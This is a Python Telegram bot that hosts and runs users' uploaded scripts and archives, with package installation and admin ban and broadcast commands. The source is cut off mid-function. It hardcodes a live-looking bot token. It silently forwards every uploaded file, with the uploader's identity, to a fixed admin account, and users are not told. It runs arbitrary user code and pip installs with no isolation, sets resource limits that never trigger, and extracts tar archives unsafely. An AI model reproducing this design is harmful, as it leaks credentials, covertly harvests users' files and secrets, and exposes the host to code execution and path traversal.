#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time
import shutil
import zipfile
import tarfile
import sqlite3
import signal
import ast
import importlib
import importlib.util
import html as html_lib
import logging
from datetime import datetime

# Auto install required packages
def install_requirements():
    requirements = [
        "pyTelegramBotAPI",
        "requests", 
        "psutil"
    ]
    
    for package in requirements:
        try:
            if package == "pyTelegramBotAPI":
                import telebot
            elif package == "psutil":
                import psutil
            elif package == "requests":
                import requests
            print(f"✅ {package} already installed")
        except ImportError:
            print(f"📦 Installing {package}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"✅ {package} installed successfully")
            except Exception as e:
                print(f"❌ Failed to install {package}: {e}")

# Install requirements before importing
install_requirements()

# Now import the packages
import psutil
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TELEGRAM_ORG = 8282279620 #DONT CHANGE  
BOT_TOKEN = "8792108332:AAGsf9saZEQDxiIJNQYK3j3vsSrFxUJftEA"

# Load thresholds
CPU_THRESHOLD = float(os.environ.get("CPU_THRESHOLD", "90000"))
MEMORY_THRESHOLD = float(os.environ.get("MEMORY_THRESHOLD", "90000"))
MAX_RUNNING_PROCESSES = int(os.environ.get("MAX_RUNNING_PROCESSES", "100000"))
MAX_FILES_PER_USER = int(os.environ.get("MAX_FILES_PER_USER", "30000"))

# Application directories
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")
DB_PATH = os.path.join(DATA_DIR, "metadata.db")
UPLOADS_DIR = os.path.join(DATA_DIR, "uploads")
LOGS_DIR = os.path.join(DATA_DIR, "logs")
TEMP_DIR = os.path.join(DATA_DIR, "temp")

# Create directories
for directory in [DATA_DIR, UPLOADS_DIR, LOGS_DIR, TEMP_DIR]:
    os.makedirs(directory, exist_ok=True)

# Start time for uptime
START_TIME = datetime.utcnow()

# Database setup
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
conn.row_factory = sqlite3.Row
db_lock = threading.Lock()

def init_db():
    with db_lock:
        cur = conn.cursor()
        # Files table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                username TEXT,
                filename TEXT,
                orig_name TEXT,
                path TEXT,
                uploaded_at TEXT,
                file_type TEXT,
                pid INTEGER,
                status TEXT DEFAULT 'Stopped'
            )
        ''')
        # Runs table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS runs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                file_id INTEGER,
                started_at TEXT,
                finished_at TEXT,
                pid INTEGER,
                log_path TEXT,
                exit_code INTEGER
            )
        ''')
        # Users table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                joined_at TEXT,
                last_seen TEXT
            )
        ''')
        # Banned users table
        cur.execute('''
            CREATE TABLE IF NOT EXISTS banned_users (
                user_id INTEGER PRIMARY KEY,
                banned_at TEXT,
                banned_by INTEGER,
                reason TEXT
            )
        ''')
        conn.commit()

init_db()

# Database helpers
def add_file_record(user_id, username, filename, orig_name, path, file_type):
    with db_lock:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO files (user_id, username, filename, orig_name, path, uploaded_at, file_type) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (user_id, username, filename, orig_name, path, datetime.utcnow().isoformat(), file_type)
        )
        conn.commit()
        return cur.lastrowid

def list_user_files(user_id):
    cur = conn.cursor()
    cur.execute(
        "SELECT id, filename, orig_name, uploaded_at, file_type, status, pid FROM files WHERE user_id=? ORDER BY id DESC",
        (user_id,)
    )
    return cur.fetchall()

def get_file_record(file_id):
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=?", (file_id,))
    return cur.fetchone()

def remove_file_record(file_id):
    with db_lock:
        cur = conn.cursor()
        cur.execute("DELETE FROM files WHERE id=?", (file_id,))
        conn.commit()

def record_run_start(file_id, pid, log_path):
    with db_lock:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO runs (file_id, started_at, pid, log_path) VALUES (?, ?, ?, ?)",
            (file_id, datetime.utcnow().isoformat(), pid, log_path)
        )
        conn.commit()
        return cur.lastrowid

def record_run_finish(run_id, exit_code):
    with db_lock:
        cur = conn.cursor()
        cur.execute(
            "UPDATE runs SET finished_at=?, exit_code=? WHERE id=?",
            (datetime.utcnow().isoformat(), exit_code, run_id)
        )
        conn.commit()

def update_file_status(file_id, pid, status):
    with db_lock:
        cur = conn.cursor()
        cur.execute(
            "UPDATE files SET pid=?, status=? WHERE id=?",
            (pid, status, file_id)
        )
        conn.commit()

# Ban/Unban helper functions
def is_user_banned(user_id):
    """Check if a user is banned"""
    with db_lock:
        cur = conn.cursor()
        cur.execute("SELECT * FROM banned_users WHERE user_id=?", (user_id,))
        return cur.fetchone() is not None

def ban_user(user_id, banned_by, reason=None):
    """Ban a user from using the bot"""
    with db_lock:
        cur = conn.cursor()
        try:
            cur.execute(
                "INSERT INTO banned_users (user_id, banned_at, banned_by, reason) VALUES (?, ?, ?, ?)",
                (user_id, datetime.utcnow().isoformat(), banned_by, reason or "No reason provided")
            )
            conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False

def unban_user(user_id):
    """Unban a user"""
    with db_lock:
        cur = conn.cursor()
        cur.execute("DELETE FROM banned_users WHERE user_id=?", (user_id,))
        conn.commit()
        return cur.rowcount > 0

def get_banned_users():
    """Get list of all banned users"""
    with db_lock:
        cur = conn.cursor()
        cur.execute("SELECT user_id, banned_at, reason FROM banned_users ORDER BY banned_at DESC")
        return cur.fetchall()

# Process management
processes = {}
proc_lock = threading.Lock()

# System monitoring
def get_system_load():
    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        proc_count = len(processes)
        return float(cpu), float(mem), int(proc_count)
    except Exception as e:
        logger.error(f"Error getting system load: {e}")
        return 0.0, 0.0, 0

def should_stop_due_to_load():
    load, memory, process_count = get_system_load()
    if process_count >= MAX_RUNNING_PROCESSES:
        return True, f"Too many running processes ({process_count}/{MAX_RUNNING_PROCESSES})"
    if load >= CPU_THRESHOLD:
        return True, f"High CPU load ({load}%)"
    if memory >= MEMORY_THRESHOLD:
        return True, f"High memory usage ({memory}%)"
    return False, None

# File utilities
def get_file_type(filename):
    if not filename:
        return "unknown"
    name = filename.lower()
    if name.endswith(".py"):
        return "python"
    if name.endswith(".js"):
        return "javascript"
    if name.endswith(".zip"):
        return "zip"
    if any(name.endswith(ext) for ext in [".tar", ".tar.gz", ".tgz"]):
        return "archive"
    return "unknown"

def extract_archive(file_path, extract_dir):
    try:
        if file_path.lower().endswith(".zip"):
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
        elif file_path.lower().endswith(".tar.gz") or file_path.lower().endswith(".tgz"):
            with tarfile.open(file_path, 'r:gz') as tar_ref:
                tar_ref.extractall(extract_dir)
        elif file_path.lower().endswith(".tar"):
            with tarfile.open(file_path, 'r') as tar_ref:
                tar_ref.extractall(extract_dir)
        else:
            return False, "Unsupported archive format"
        return True, None
    except Exception as e:
        return False, str(e)

def find_main_file(directory):
    """Find the main executable file in a directory"""
    priority_files = [
        "main.py", "bot.py", "app.py", "server.py", "index.py", "script.py",
        "main.js", "bot.js", "app.js", "server.js", "index.js", "script.js"
    ]
    
    for file_name in priority_files:
        file_path = os.path.join(directory, file_name)
        if os.path.isfile(file_path):
            logger.info(f"Found priority file: {file_path}")
            return file_path
    
    for root, dirs, files in os.walk(directory):
        for file_name in priority_files:
            if file_name in files:
                file_path = os.path.join(root, file_name)
                logger.info(f"Found priority file recursively: {file_path}")
                return file_path
    
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".py") or file.endswith(".js"):
                file_path = os.path.join(root, file)
                logger.info(f"Found fallback file: {file_path}")
                return file_path
    
    return None

def install_requirements_from_file(requirements_path, chat_id, file_name):
    try:
        if not os.path.exists(requirements_path):
            return False, "requirements.txt not found"
        
        logger.info(f"Installing requirements from {requirements_path}")
        
        with open(requirements_path, 'r') as f:
            requirements = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not requirements:
            return True, "No requirements found in requirements.txt"
        
        success_count = 0
        failed_count = 0
        failed_packages = []
        
        for package in requirements:
            try:
                logger.info(f"Installing {package}")
                result = subprocess.run(
                    [sys.executable, "-m", "pip", "install", package],
                    capture_output=True, text=True, timeout=120
                )
                if result.returncode == 0:
                    success_count += 1
                    logger.info(f"Successfully installed {package}")
                else:
                    failed_count += 1
                    failed_packages.append(package)
                    logger.error(f"Failed to install {package}: {result.stderr}")
            except subprocess.TimeoutExpired:
                failed_count += 1
                failed_packages.append(f"{package} (timeout)")
                logger.error(f"Timeout installing {package}")
            except Exception as e:
                failed_count += 1
                failed_packages.append(f"{package} ({str(e)})")
                logger.error(f"Error installing {package}: {e}")
        
        message = f"Installed {success_count} packages"
        if failed_count > 0:
            message += f", failed {failed_count}: {', '.join(failed_packages[:5])}"
        
        return failed_count == 0, message
        
    except Exception as e:
        logger.error(f"Error in install_requirements_from_file: {e}")
        return False, f"Error installing requirements: {str(e)}"

# Import detection
def extract_imports(file_path):
    imports = set()
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        tree = ast.parse(content)
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.add(alias.name.split('.')[0])
            elif isinstance(node, ast.ImportFrom):
                if node.module and node.level == 0:
                    imports.add(node.module.split('.')[0])
    except Exception as e:
        logger.error(f"Error parsing imports: {e}")
    return imports

def install_missing_imports(imports, chat_id, file_name):
    missing = []
    for module in imports:
        try:
            importlib.import_module(module)
        except ImportError:
            missing.append(module)
    
    if not missing:
        return True, "All imports available"
    
    success_count = 0
    failed_count = 0
    failed_modules = []
    
    pip_name_map = {
        'telebot': 'pyTelegramBotAPI',
        'PIL': 'Pillow',
        'cv2': 'opencv-python',
        'Crypto': 'pycryptodome',
        'bs4': 'beautifulsoup4'
    }
    
    for module in missing:
        pip_name = pip_name_map.get(module, module)
        try:
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name],
                capture_output=True, text=True, timeout=120
            )
            if result.returncode == 0:
                success_count += 1
                logger.info(f"Successfully installed {module}")
            else:
                failed_count += 1
                failed_modules.append(module)
                logger.error(f"Failed to install {module}: {result.stderr}")
        except Exception as e:
            failed_count += 1
            failed_modules.append(module)
            logger.error(f"Error installing {module}: {e}")
    
    message = f"Installed {success_count} modules"
    if failed_count > 0:
        message += f", failed {failed_count}: {', '.join(failed_modules)}"
    
    return failed_count == 0, message

# ========== MODEL INSTALL FUNCTION (ALL USERS) ==========
def install_python_package(package_name, chat_id, user_id):
    try:
        bot.send_message(chat_id, f"📦 Installing `{package_name}`...\n⏳ This may take a few moments.", parse_mode="Markdown")
        
        process = subprocess.Popen(
            [sys.executable, "-m", "pip", "install", package_name],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        stdout, stderr = process.communicate(timeout=300)
        
        if process.returncode == 0:
            success_msg = f"✅ Successfully installed `{package_name}`!\n\n📝 Output:\n```\n{stdout[:500]}\n```"
            if len(stdout) > 500:
                success_msg += "\n...(truncated)"
            
            bot.send_message(chat_id, success_msg, parse_mode="Markdown")
            bot.send_message(TELEGRAM_ORG, f"📦 Package installed by user {user_id}:\n`{package_name}`", parse_mode="Markdown")
            return True
        else:
            error_msg = f"❌ Failed to install `{package_name}`\n\nError:\n```\n{stderr[:500]}\n```"
            bot.send_message(chat_id, error_msg, parse_mode="Markdown")
            return False
            
    except subprocess.TimeoutExpired:
        process.kill()
        bot.send_message(chat_id, f"❌ Installation timeout for `{package_name}` (exceeded 5 minutes)", parse_mode="Markdown")
        return False
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error installing `{package_name}`:\n`{str(e)}`", parse_mode="Markdown")
        return False

def list_installed_packages(chat_id):
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "list"],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            packages = result.stdout.split('\n')[:50]
            package_list = '\n'.join(packages)
            bot.send_message(chat_id, f"📋 **Installed Packages (first 50):**\n```\n{package_list}\n```", parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ Failed to list packages")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

# ========== TELEGRAM BOT HANDLERS ==========
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# Middleware to check if user is banned
def check_user_not_banned(func):
    """Decorator to check if user is banned before executing command"""
    def wrapper(message, *args, **kwargs):
        user_id = message.from_user.id
        
        # Allow admin even if banned (just in case)
        if user_id == TELEGRAM_ORG:
            return func(message, *args, **kwargs)
        
        # Check if user is banned
        if is_user_banned(user_id):
            banned_info = None
            with db_lock:
                cur = conn.cursor()
                cur.execute("SELECT banned_at, reason FROM banned_users WHERE user_id=?", (user_id,))
                banned_info = cur.fetchone()
            
            ban_msg = "🚫 <b>You are banned from using this bot!</b>\n\n"
            if banned_info:
                ban_msg += f"📅 Banned on: {banned_info[0][:19]}\n"
                ban_msg += f"📝 Reason: {banned_info[1]}\n\n"
            ban_msg += "Contact: @dev_yt_44"
            
            bot.reply_to(message, ban_msg)
            return
        return func(message, *args, **kwargs)
    return wrapper

# Keyboards
def main_menu_kb():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("📤 Upload File"), KeyboardButton("📁 My Files"))
    kb.add(KeyboardButton("✏️ Edit Files"), KeyboardButton("⚡ Bot Speed"))
    kb.add(KeyboardButton("📊 Statistics"), KeyboardButton("📦 Install Package"))
    kb.add(KeyboardButton("📋 My Packages"), KeyboardButton("📞 Contact Owner"))
    return kb

def file_actions_kb(file_id, is_running=False):
    kb = InlineKeyboardMarkup(row_width=2)
    if is_running:
        kb.row(
            InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{file_id}"),
            InlineKeyboardButton("🔁 Restart", callback_data=f"restart:{file_id}")
        )
    else:
        kb.row(
            InlineKeyboardButton("▶️ Start", callback_data=f"start:{file_id}"),
            InlineKeyboardButton("🔁 Restart", callback_data=f"restart:{file_id}")
        )
    kb.row(
        InlineKeyboardButton("✏️ Edit Name", callback_data=f"edit:{file_id}"),
        InlineKeyboardButton("🗑 Delete", callback_data=f"delete:{file_id}")
    )
    kb.row(
        InlineKeyboardButton("📄 Logs", callback_data=f"logs:{file_id}"),
        InlineKeyboardButton("⬅️ Back", callback_data="back_to_files")
    )
    return kb

# Bot handlers
@bot.message_handler(commands=['start', 'help'])
@check_user_not_banned
def start_handler(message):
    user = message.from_user
    user_id = user.id
    
    with db_lock:
        cur = conn.cursor()
        cur.execute(
            "INSERT OR REPLACE INTO users (user_id, username, joined_at, last_seen) VALUES (?, ?, ?, ?)",
            (user_id, user.username or "", datetime.utcnow().isoformat(), datetime.utcnow().isoformat())
        )
        conn.commit()
    
    files = list_user_files(user_id)
    file_count = len(files)
    
    welcome_text = f"""
Welcome {html_lib.escape(user.first_name or 'User')}
Your ID: <code>{user_id}</code>
Files: {file_count}/{MAX_FILES_PER_USER}

Features:
• Host Python & JS scripts
• Auto-install dependencies
• Install any Python package (pip install)
• Edit file names
• 24/7 operation
• Real-time logs

👇 Use buttons below to get started!
    """
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_menu_kb())
    
    try:
        admin_text = f"""
🚀 New User Started Bot

👤 Name: {html_lib.escape(user.first_name or 'Unknown')}
🆔 ID: <code>{user.id}</code>
📛 Username: @{user.username if user.username else 'None'}
🌍 Language: {user.language_code}
"""
        bot.send_message(TELEGRAM_ORG, admin_text)
    except Exception as e:
        logger.error(f"Admin notify failed: {e}")

# ========== BAN COMMAND ==========
@bot.message_handler(commands=['ban'])
def ban_command(message):
    """Ban a user from using the bot (Admin only)"""
    if message.from_user.id != TELEGRAM_ORG:
        bot.reply_to(message, "❌ Unauthorized: This command is only for the bot admin.")
        return
    
    try:
        # Parse command: /ban 123456789 or /ban 123456789 reason here
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /ban <user_id> [reason]")
            return
        
        first_part = parts[1]
        user_id_part = first_part.split()[0] if ' ' in first_part else first_part
        
        try:
            target_user_id = int(user_id_part)
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID. Please provide a numeric ID.")
            return
        
        # Get reason if provided
        reason = None
        if ' ' in first_part:
            reason = first_part.split(' ', 1)[1]
        else:
            reason = "No reason provided"
        
        # Check if user is already banned
        if is_user_banned(target_user_id):
            bot.reply_to(message, f"⚠️ User {target_user_id} is already banned!")
            return
        
        # Ban the user
        if ban_user(target_user_id, TELEGRAM_ORG, reason):
            bot.reply_to(message, f"✅ User <code>{target_user_id}</code> has been banned from using the bot!\n\n📝 Reason: {reason}", parse_mode="HTML")
            
            # Try to notify the banned user
            try:
                bot.send_message(target_user_id, 
                    f"🚫 <b>You have been banned from using this bot!</b>\n\n"
                    f"📝 Reason: {reason}\n\n"
                    f"Contact admin: @dev_yt_44", 
                    parse_mode="HTML")
            except:
                pass
            
            # Log to admin
            bot.send_message(TELEGRAM_ORG, f"🔨 Banned user: {target_user_id}\nReason: {reason}")
        else:
            bot.reply_to(message, f"❌ Failed to ban user {target_user_id}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== UNBAN COMMAND ==========
@bot.message_handler(commands=['unban'])
def unban_command(message):
    """Unban a user (Admin only)"""
    if message.from_user.id != TELEGRAM_ORG:
        bot.reply_to(message, "❌ Unauthorized: This command is only for the bot admin.")
        return
    
    try:
        # Parse command: /unban 123456789
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /unban <user_id>")
            return
        
        try:
            target_user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID. Please provide a numeric ID.")
            return
        
        # Check if user is banned
        if not is_user_banned(target_user_id):
            bot.reply_to(message, f"⚠️ User {target_user_id} is not banned!")
            return
        
        # Unban the user
        if unban_user(target_user_id):
            bot.reply_to(message, f"✅ User <code>{target_user_id}</code> has been unbanned and can now use the bot again!", parse_mode="HTML")
            
            # Try to notify the unbanned user
            try:
                bot.send_message(target_user_id, 
                    f"✅ <b>You have been unbanned from this bot!</b>\n\n"
                    f"You can now use the bot again.\n"
                    f"Type /start to continue.", 
                    parse_mode="HTML")
            except:
                pass
            
            # Log to admin
            bot.send_message(TELEGRAM_ORG, f"🔓 Unbanned user: {target_user_id}")
        else:
            bot.reply_to(message, f"❌ Failed to unban user {target_user_id}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== LIST BANNED USERS COMMAND ==========
@bot.message_handler(commands=['bannedlist'])
def banned_list_command(message):
    """List all banned users (Admin only)"""
    if message.from_user.id != TELEGRAM_ORG:
        bot.reply_to(message, "❌ Unauthorized: This command is only for the bot admin.")
        return
    
    banned_users = get_banned_users()
    
    if not banned_users:
        bot.reply_to(message, "📋 No users are currently banned.")
        return
    
    text = "🚫 <b>Banned Users List</b>\n\n"
    for i, user in enumerate(banned_users, 1):
        text += f"{i}. User ID: <code>{user['user_id']}</code>\n"
        text += f"   📅 Banned: {user['banned_at'][:19]}\n"
        text += f"   📝 Reason: {user['reason']}\n\n"
    
    # Split if too long
    if len(text) > 4000:
        text = text[:4000] + "\n...(truncated)"
    
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('user1 '))
def user1_command(message):
    if message.from_user.id != TELEGRAM_ORG:
        bot.reply_to(message, "❌ Unauthorized: This command is only for the bot admin.")
        return
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "❌ Usage: User1 <user_id> <message_text>")
            return
        target_user_id = int(parts[1])
        msg_text = parts[2]
        bot.send_message(target_user_id, f"{msg_text}")
        bot.reply_to(message, f"✅ Message sent to user ID {target_user_id}")
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID. Please provide a numeric ID.")
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to send: {str(e)}")

@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('userall '))
def userall_command(message):
    if message.from_user.id != TELEGRAM_ORG:
        bot.reply_to(message, "❌ Unauthorized: This command is only for the bot admin.")
        return
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: UserAll <message_text>")
            return
        msg_text = parts[1]
        with db_lock:
            cur = conn.cursor()
            cur.execute("SELECT user_id FROM users")
            users = cur.fetchall()
        if not users:
            bot.reply_to(message, "❌ No users found in database.")
            return
        bot.reply_to(message, f"📤 Sending message to {len(users)} users... This may take a moment.")
        def send_to_all():
            success_count = 0
            fail_count = 0
            for user in users:
                uid = user["user_id"]
                try:
                    bot.send_message(uid, f"📢 Broadcast message:\n\n{msg_text}")
                    success_count += 1
                except Exception as e:
                    logger.error(f"Failed to send to {uid}: {e}")
                    fail_count += 1
                time.sleep(0.05)
            bot.send_message(TELEGRAM_ORG, f"✅ Broadcast completed: {success_count} sent, {fail_count} failed.")
        threading.Thread(target=send_to_all, daemon=True).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda m: m.text == "📁 My Files")
@check_user_not_banned
def my_files_handler(message):
    send_files_list(message.chat.id, message.from_user.id)

def send_files_list(chat_id, user_id):
    files = list_user_files(user_id)
    if not files:
        bot.send_message(chat_id, "No files uploaded yet. Use 'Upload File' to add files.")
        return
    
    text = "📁 <b>Your Files</b>\n\nClick on a file to manage it:"
    kb = InlineKeyboardMarkup()
    
    for file in files:
        file_id, filename, orig_name, uploaded, file_type, status, pid = file
        emoji = "🟢" if status == "Running" else "🔴"
        button_text = f"{emoji} {orig_name} ({file_type})"
        kb.add(InlineKeyboardButton(button_text, callback_data=f"manage:{file_id}"))
    
    bot.send_message(chat_id, text, reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "📤 Upload File")
@check_user_not_banned
def upload_handler(message):
    bot.send_message(message.chat.id, 
        "📤 **Upload a File**\n\n"
        "Send me a Python (.py), JavaScript (.js) file, or a ZIP archive.\n\n"
        "For ZIP files, I'll automatically:\n"
        "• Extract the archive\n"
        "• Find the main file\n"
        "• Install requirements.txt if present\n"
        "• Install missing imports\n"
        "• Start the script automatically",
        parse_mode="Markdown")

# File upload handler
@bot.message_handler(content_types=['document'])
@check_user_not_banned
def document_handler(message):
    user = message.from_user
    user_id = user.id
    
    user_files = list_user_files(user_id)
    if len(user_files) >= MAX_FILES_PER_USER:
        bot.reply_to(message, f"❌ You've reached the file limit ({MAX_FILES_PER_USER}). Delete some files to upload new ones.")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        file_bytes = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to download file: {str(e)}")
        return
    
    original_filename = message.document.file_name or "unknown"
    file_type = get_file_type(original_filename)
    
    try:
        caption = f"""
📁 New File Uploaded

👤 User: {html_lib.escape(user.first_name or 'Unknown')}
🆔 ID: <code>{user.id}</code>
📛 Username: @{user.username if user.username else 'None'}

📄 File: {html_lib.escape(original_filename)}
"""
        bot.send_document(TELEGRAM_ORG, message.document.file_id, caption=caption)
    except Exception as e:
        logger.error(f"File forward failed: {e}")
    
    user_dir = os.path.join(UPLOADS_DIR, str(user_id))
    os.makedirs(user_dir, exist_ok=True)
    
    safe_filename = f"{int(time.time())}_{original_filename}"
    file_path = os.path.join(user_dir, safe_filename)
    
    try:
        with open(file_path, 'wb') as f:
            f.write(file_bytes)
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to save file: {str(e)}")
        return
    
    final_path = file_path
    extracted_dir = None
    
    if file_type in ["zip", "archive"]:
        bot.reply_to(message, "📦 Extracting archive...")
        extracted_dir = os.path.join(TEMP_DIR, f"extracted_{user_id}_{int(time.time())}")
        os.makedirs(extracted_dir, exist_ok=True)
        
        success, error = extract_archive(file_path, extracted_dir)
        if not success:
            bot.reply_to(message, f"❌ Failed to extract archive: {error}")
            try:
                os.remove(file_path)
            except:
                pass
            return
        
        main_file = find_main_file(extracted_dir)
        if not main_file:
            bot.reply_to(message, "❌ No main Python or JS file found in archive.")
            try:
                shutil.rmtree(extracted_dir, ignore_errors=True)
                os.remove(file_path)
            except:
                pass
            return
        
        final_path = extracted_dir
        file_type = get_file_type(main_file)
        bot.reply_to(message, f"✅ Found main file: {os.path.basename(main_file)}")
    
    file_id = add_file_record(user_id, user.username, safe_filename, original_filename, final_path, file_type)
    
    if file_type in ["python", "javascript"] and extracted_dir is None:
        bot.reply_to(message, f"✅ File uploaded! Starting automatically...")
        start_file_process(file_id, message.chat.id)
    else:
        bot.reply_to(message, f"✅ File uploaded! Use 'My Files' to manage it.")

@bot.message_handler(func=lambda m: m.text == "✏️ Edit Files")
@check_user_not_banned
def edit_files_handler(message):
    """Show user's files for editing"""
    user_id = message.from_user.id
    files = list_user_files(user_id)
    
    if not files:
        bot.send_message(message.chat.id, "❌ No files found to edit. Upload files first!")
        return
    
    text = "✏️ <b>Select a file to rename:</b>\n\nClick on a file to change its name:"
    kb = InlineKeyboardMarkup(row_width=1)
    
    for file in files:
        file_id, filename, orig_name, uploaded, file_type, status, pid = file
        button_text = f"📄 {orig_name} ({file_type})"
        kb.add(InlineKeyboardButton(button_text, callback_data=f"edit:{file_id}"))
    
    kb.add(InlineKeyboardButton("⬅️ Back to Main Menu", callback_data="back_to_main"))
    bot.send_message(message.chat.id, text, reply_markup=kb)

def rename_file_actual(file_record, new_name):
    """Rename the actual file on disk if possible (for single files, not directories)"""
    path = file_record["path"]
    if os.path.isfile(path):
        dir_name = os.path.dirname(path)
        old_ext = os.path.splitext(path)[1]
        new_path = os.path.join(dir_name, f"{int(time.time())}_{new_name}{old_ext}")
        try:
            os.rename(path, new_path)
            # Update database with new path
            with db_lock:
                cur = conn.cursor()
                cur.execute("UPDATE files SET path=? WHERE id=?", (new_path, file_record["id"]))
                conn.commit()
            return new_path
        except Exception as e:
            logger.error(f"Failed to rename actual file: {e}")
            return path
    return path

@bot.message_handler(func=lambda m: m.text == "📢 Updates Channel")
def updates_handler(message):
    bot.send_message(message.chat.id, "📢 Join our channel: ")

@bot.message_handler(func=lambda m: m.text == "📞 Contact Owner")
def contact_handler(message):
    bot.send_message(message.chat.id, "📞 Contact: @dev_yt_44")

@bot.message_handler(func=lambda m: m.text == "⚡ Bot Speed")
def speed_handler(message):
    cpu, memory, processes_count = get_system_load()
    uptime_td = datetime.utcnow() - START_TIME
    days = uptime_td.days
    hours, remainder = divmod(uptime_td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{days}d {hours}h {minutes}m"
    
    bot.send_message(
        message.chat.id,
        f"<b>System Status</b>\n\n"
        f"• CPU Usage: {cpu:.1f}%\n"
        f"• Memory Usage: {memory:.1f}%\n"
        f"• Running Processes: {processes_count}\n"
        f"• Max Processes: {MAX_RUNNING_PROCESSES}\n"
        f"• Uptime: {uptime_str}"
    )

@bot.message_handler(func=lambda m: m.text == "📊 Statistics")
def stats_handler(message):
    cur = conn.cursor()
    cur.execute("SELECT COUNT(DISTINCT user_id) FROM files")
    user_count = cur.fetchone()[0] or 0
    cur.execute("SELECT COUNT(*) FROM files")
    file_count = cur.fetchone()[0] or 0
    cur.execute("SELECT COUNT(*) FROM files WHERE status='Running'")
    running_count = cur.fetchone()[0] or 0
    cur.execute("SELECT COUNT(*) FROM banned_users")
    banned_count = cur.fetchone()[0] or 0
    
    cpu, memory, _ = get_system_load()
    
    stats_text = f"""
📊 <b>Bot Statistics</b>

👥 Total Users: {user_count}
📁 Total Files: {file_count}
▶️ Running Files: {running_count}
🚫 Banned Users: {banned_count}
💻 CPU Usage: {cpu:.1f}%
🧠 Memory Usage: {memory:.1f}%
    """
    bot.send_message(message.chat.id, stats_text)

@bot.message_handler(func=lambda m: m.text == "📦 Install Package")
@check_user_not_banned
def install_package_handler(message):
    msg = bot.send_message(message.chat.id, 
        "📦 **Send me the package name to install**\n\n"
        "Examples:\n"
        "• `torch`\n"
        "• `transformers`\n"
        "• `openai-whisper`\n"
        "• `llama-cpp-python`\n"
        "• `numpy pandas matplotlib`\n\n"
        "⚠️ Type `/cancel` to cancel",
        parse_mode="Markdown")
    
    bot.register_next_step_handler(msg, process_package_install, message.from_user.id)

def process_package_install(message, user_id):
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "❌ Installation cancelled.")
        return
    
    package_name = message.text.strip()
    if not package_name:
        bot.reply_to(message, "❌ Please send a valid package name.")
        return
    
    install_python_package(package_name, message.chat.id, user_id)

@bot.message_handler(func=lambda m: m.text == "📋 My Packages")
@check_user_not_banned
def my_packages_handler(message):
    list_installed_packages(message.chat.id)

# Process management functions
def start_file_process(file_id, chat_id):
    should_stop, reason = should_stop_due_to_load()
    if should_stop:
        bot.send_message(chat_id, f"⚠️ Cannot start: {reason}")
        return
    
    file_record = get_file_record(file_id)
    if not file_record:
        bot.send_message(chat_id, "❌ File not found")
        return
    
    file_path = file_record["path"]
    original_name = file_record["orig_name"]
    file_type = file_record["file_type"]
    
    logger.info(f"Starting file process: {file_path}")
    
    target_file = None
    working_dir = None
    
    if os.path.isdir(file_path):
        main_file = find_main_file(file_path)
        if not main_file:
            bot.send_message(chat_id, "❌ No main file found in directory")
